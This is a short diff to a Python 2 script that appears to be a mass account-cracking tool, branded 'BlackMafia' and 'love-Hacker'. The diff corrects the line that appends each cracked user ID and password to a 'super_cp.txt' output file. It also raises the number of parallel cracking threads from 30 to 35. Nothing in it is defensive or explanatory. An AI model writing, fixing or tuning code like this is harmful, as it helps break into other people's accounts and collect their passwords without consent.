@@ -611,7 +611,7 @@ def pilih_super():
 				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
 				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass10 + '\n'
 				                                                               cek = open("out/super_cp.txt", "a")
-				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
+				                                                               cek.write("ID:" +user+ " Pw:" +pass10+"\n")
 				                                                               cek.close()
 				                                                               cekpoint.append(user+pass10)										                                       
 																	
@@ -619,7 +619,7 @@ def pilih_super():
 		except:
 			pass
 		
-	p = ThreadPool(30)
+	p = ThreadPool(35)
 	p.map(main, id)
 	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 	print "  \033[1;91m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
